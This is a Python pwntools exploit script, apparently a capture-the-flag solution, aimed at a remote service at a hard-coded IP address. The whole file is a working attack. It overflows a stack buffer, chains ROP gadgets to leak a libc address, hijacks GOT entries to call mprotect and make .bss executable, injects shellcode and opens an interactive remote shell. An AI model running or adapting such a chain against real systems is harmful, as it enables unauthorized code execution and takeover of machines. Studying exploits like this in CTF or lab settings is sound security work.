#!/usr/bin/env python
from pwn import *
context.arch = 'amd64'
#r = process('/tmp/p/a')
r = remote('209.222.100.138',9884)

trash = 'a'*136
write = 0x4004b0
read = 0x4004c0
pop_rdi = 0x00000000004006b3
pop_rsi_r15 = 0x00000000004006b1
pop3_ret = 0x00000000004006af
write_got = 0x000000000600a58
libc_start_main_got = 0x000000000600a68
gmon_start_got = 0x000000000600a70
bss = 0x600a88
main = 0x000000000040061a

write_off = 0x00000000000eb700
mprotect_off = 0x00000000000f48d0
pad = trash + flat([pop_rdi, 1, pop_rsi_r15, write_got, 0, write])
pad +=flat([pop_rsi_r15, libc_start_main_got, 0, pop_rdi, 0, read])
pad +=flat([pop_rsi_r15, bss, 0, read])
pad +=flat([pop_rsi_r15, gmon_start_got, 0, read])
pad += p64(main)
"""
write(1, write@got, ?) < leak base and calculate mprotect
read(0, libc_start_main, ?) < got hijack: mprotect
read(0, bss, ?) < put shellcode
read(0, gmon_start, ?) < got hijack: bss (shellcode)
jmp to main
"""
r.recvuntil('Input:\n')
r.send(pad)
base = u64(r.recv(8)) - write_off
print "base: ",hex(base)
mpro = base + mprotect_off
r.send(p64(mpro))
sh = asm(shellcraft.sh())
print "length of shellcode: ",len(sh)
r.send(sh)
r.send(p64(bss))
print r.recvrepeat(3)
"""
  400690:       4c 89 ea                mov    rdx,r13
  400693:       4c 89 f6                mov    rsi,r14
  400696:       44 89 ff                mov    edi,r15d
  400699:       41 ff 14 dc             call   QWORD PTR [r12+rbx*8]
  40069d:       48 83 c3 01             add    rbx,0x1
  4006a1:       48 39 eb                cmp    rbx,rbp
  4006a4:       75 ea                   jne    400690 <__libc_csu_init+0x40>
  4006a6:       48 83 c4 08             add    rsp,0x8
  4006aa:       5b                      pop    rbx
  4006ab:       5d                      pop    rbp
  4006ac:       41 5c                   pop    r12
  4006ae:       41 5d                   pop    r13
  4006b0:       41 5e                   pop    r14
  4006b2:       41 5f                   pop    r15
  4006b4:       c3                      ret
"""


pad2 = trash
pad2 +=p64(0x4006a6) ## jmp this addr
pad2 +="12345678" ## padding
pad2 +=p64(0) # rbx
pad2 +=p64(1) # rbp
pad2 +=p64(libc_start_main_got)
# r12->addr >> call mprotect to set 0x600000(rw-p)
# to rwxp so shellcode can be execute
pad2 +=p64(7) # r13 -> rdx , 7 mean rwx
pad2 +=p64(0x1000) # r14 -> rsi
pad2 +=p64(0x00600000) # r15 -> rdi
pad2 +=p64(0x400690) # call mprotect

pad2 += "12345678" # padding
pad2 += p64(0) # rbx
pad2 += p64(1) # rsp
pad2 += p64(gmon_start_got) # r12 -> addr , call shellcode
pad2 += p64(0)
pad2 += p64(0)
pad2 += p64(0)
pad2 += p64(0x400690) # call shellcode

r.send(pad2)
r.interactive()

